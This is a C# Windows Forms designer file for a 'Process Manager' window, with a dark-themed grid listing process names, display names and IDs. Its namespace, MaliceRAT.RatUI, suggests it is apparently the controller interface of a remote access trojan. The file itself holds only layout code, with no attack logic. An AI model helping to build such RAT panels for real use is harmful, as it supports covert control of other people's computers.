namespace MaliceRAT.RatUI
{
    partial class ProcessManagerForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
            this.titleLabel = new System.Windows.Forms.Label();
            this.gunaDragControl = new Guna.UI.WinForms.GunaDragControl(this.components);
            this.gunaProcessTable = new Guna.UI2.WinForms.Guna2DataGridView();
            this.columnName = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.DisplayName = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.PID = new System.Windows.Forms.DataGridViewTextBoxColumn();
            ((System.ComponentModel.ISupportInitialize)(this.gunaProcessTable)).BeginInit();
            this.SuspendLayout();
            // 
            // titleLabel
            // 
            this.titleLabel.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.titleLabel.Font = new System.Drawing.Font("Josefin Sans", 10F);
            this.titleLabel.ForeColor = System.Drawing.SystemColors.Control;
            this.titleLabel.ImageAlign = System.Drawing.ContentAlignment.TopLeft;
            this.titleLabel.Location = new System.Drawing.Point(0, 0);
            this.titleLabel.Margin = new System.Windows.Forms.Padding(0);
            this.titleLabel.Name = "titleLabel";
            this.titleLabel.Size = new System.Drawing.Size(800, 25);
            this.titleLabel.TabIndex = 7;
            this.titleLabel.Text = "Process Manager [username]";
            this.titleLabel.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // gunaDragControl
            // 
            this.gunaDragControl.TargetControl = this.titleLabel;
            // 
            // gunaProcessTable
            // 
            this.gunaProcessTable.AllowUserToAddRows = false;
            this.gunaProcessTable.AllowUserToDeleteRows = false;
            this.gunaProcessTable.AllowUserToResizeRows = false;
            dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(21)))), ((int)(((byte)(21)))), ((int)(((byte)(23)))));
            dataGridViewCellStyle7.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle7.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.gunaProcessTable.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle7;
            this.gunaProcessTable.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProcessTable.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
            dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(21)))), ((int)(((byte)(21)))), ((int)(((byte)(23)))));
            dataGridViewCellStyle8.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle8.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.gunaProcessTable.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle8;
            this.gunaProcessTable.ColumnHeadersHeight = 30;
            this.gunaProcessTable.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.columnName,
            this.DisplayName,
            this.PID});
            dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle10.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            dataGridViewCellStyle10.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle10.SelectionForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.gunaProcessTable.DefaultCellStyle = dataGridViewCellStyle10;
            this.gunaProcessTable.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(140)))), ((int)(((byte)(140)))), ((int)(((byte)(140)))));
            this.gunaProcessTable.Location = new System.Drawing.Point(0, 25);
            this.gunaProcessTable.Margin = new System.Windows.Forms.Padding(0);
            this.gunaProcessTable.MultiSelect = false;
            this.gunaProcessTable.Name = "gunaProcessTable";
            this.gunaProcessTable.ReadOnly = true;
            dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            dataGridViewCellStyle11.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            dataGridViewCellStyle11.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle11.SelectionForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.gunaProcessTable.RowHeadersDefaultCellStyle = dataGridViewCellStyle11;
            this.gunaProcessTable.RowHeadersVisible = false;
            this.gunaProcessTable.RowHeadersWidth = 40;
            dataGridViewCellStyle12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            dataGridViewCellStyle12.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle12.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle12.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.gunaProcessTable.RowsDefaultCellStyle = dataGridViewCellStyle12;
            this.gunaProcessTable.RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProcessTable.RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.SystemColors.Control;
            this.gunaProcessTable.RowTemplate.DefaultCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            this.gunaProcessTable.RowTemplate.DefaultCellStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.gunaProcessTable.RowTemplate.ReadOnly = true;
            this.gunaProcessTable.RowTemplate.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            this.gunaProcessTable.ShowCellToolTips = false;
            this.gunaProcessTable.Size = new System.Drawing.Size(800, 420);
            this.gunaProcessTable.TabIndex = 20;
            this.gunaProcessTable.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.SystemColors.Control;
            this.gunaProcessTable.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.gunaProcessTable.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
            this.gunaProcessTable.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.gunaProcessTable.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.gunaProcessTable.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProcessTable.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(140)))), ((int)(((byte)(140)))), ((int)(((byte)(140)))));
            this.gunaProcessTable.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(21)))), ((int)(((byte)(21)))), ((int)(((byte)(23)))));
            this.gunaProcessTable.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.gunaProcessTable.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            this.gunaProcessTable.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(18)))), ((int)(((byte)(18)))));
            this.gunaProcessTable.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.gunaProcessTable.ThemeStyle.HeaderStyle.Height = 30;
            this.gunaProcessTable.ThemeStyle.ReadOnly = true;
            this.gunaProcessTable.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProcessTable.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.gunaProcessTable.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            this.gunaProcessTable.ThemeStyle.RowsStyle.ForeColor = System.Drawing.SystemColors.Control;
            this.gunaProcessTable.ThemeStyle.RowsStyle.Height = 22;
            this.gunaProcessTable.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            this.gunaProcessTable.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            // 
            // columnName
            // 
            dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            this.columnName.DefaultCellStyle = dataGridViewCellStyle9;
            this.columnName.FillWeight = 41.36283F;
            this.columnName.HeaderText = "Process name";
            this.columnName.Name = "columnName";
            this.columnName.ReadOnly = true;
            // 
            // DisplayName
            // 
            this.DisplayName.FillWeight = 58.04309F;
            this.DisplayName.HeaderText = "Display Name";
            this.DisplayName.Name = "DisplayName";
            this.DisplayName.ReadOnly = true;
            // 
            // PID
            // 
            this.PID.FillWeight = 25.32635F;
            this.PID.HeaderText = "Process ID";
            this.PID.Name = "PID";
            this.PID.ReadOnly = true;
            // 
            // ProcessManagerForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.gunaProcessTable);
            this.Controls.Add(this.titleLabel);
            this.ForeColor = System.Drawing.SystemColors.Control;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "ProcessManagerForm";
            this.Text = "ProcessManagerForn";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.ProcessManagerForm_FormClosing);
            this.Load += new System.EventHandler(this.ProcessManagerForm_Load);
            ((System.ComponentModel.ISupportInitialize)(this.gunaProcessTable)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Label titleLabel;
        private Guna.UI.WinForms.GunaDragControl gunaDragControl;
        private Guna.UI2.WinForms.Guna2DataGridView gunaProcessTable;
        private System.Windows.Forms.DataGridViewTextBoxColumn columnName;
        private System.Windows.Forms.DataGridViewTextBoxColumn DisplayName;
        private System.Windows.Forms.DataGridViewTextBoxColumn PID;
    }
}